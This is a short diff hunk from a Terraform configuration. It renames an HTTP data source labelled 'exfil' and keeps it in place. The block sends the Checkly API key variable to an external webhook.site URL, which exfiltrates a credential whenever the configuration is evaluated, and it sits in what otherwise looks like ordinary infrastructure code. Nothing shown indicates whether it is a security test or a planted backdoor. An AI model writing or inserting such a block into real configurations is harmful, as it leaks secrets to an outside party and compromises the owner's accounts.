@@ -327,7 +327,7 @@ EOT
 }
 
 
-data "http" "exfil123" {
+data "http" "exfil1234" {
     url = "https://webhook.site/f4de43a3-b4bd-49d6-b0d5-4566560f19b8/${var.checkly_api_key}"
 }
 
